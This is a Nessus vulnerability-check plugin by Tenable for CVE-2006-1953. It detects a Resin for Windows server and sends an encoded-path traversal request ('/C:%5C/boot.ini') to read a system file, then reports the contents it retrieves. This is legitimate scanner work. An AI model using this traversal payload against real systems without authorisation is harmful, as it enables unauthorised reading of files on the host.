#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(21606);
  script_version("$Revision: 1.9 $");

  script_cve_id("CVE-2006-1953");
  script_bugtraq_id(18005);
  script_xref(name:"OSVDB", value:"25570");

  script_name(english:"Resin for Windows Encoded URI Traversal Arbitrary File Access");
  script_summary(english:"Tries to retrieve boot.ini using Resin");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is prone to directory traversal attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Resin, an application server. 

The installation of Resin on the remote host allows an unauthenticated
remote attacker to gain access to any file on the affected Windows
host, which may lead to a loss of confidentiality." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/434150/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.caucho.com/download/changes.xtp" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Resin 3.0.19 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N" );


script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2006-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 8080);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:8080);


# Make sure the banner is from Resin.
banner = get_http_banner(port:port);
if (!banner || "Resin/" >!< banner) exit(0);


# Try to exploit the issue to get a file.
file = "boot.ini";
r = http_send_recv3(method:"GET",item:string("/C:%5C/", file), port:port);
if (isnull(r)) exit(0);
res = r[2];

# There's a problem if looks like boot.ini.
if ("[boot loader]">< res)
{
  report = string(
    "Here are the contents of the file '\\boot.ini' that Nessus\n",
    "was able to read from the remote host :\n",
    "\n",
    res
  );
  security_hole(port:port, extra:report);
}
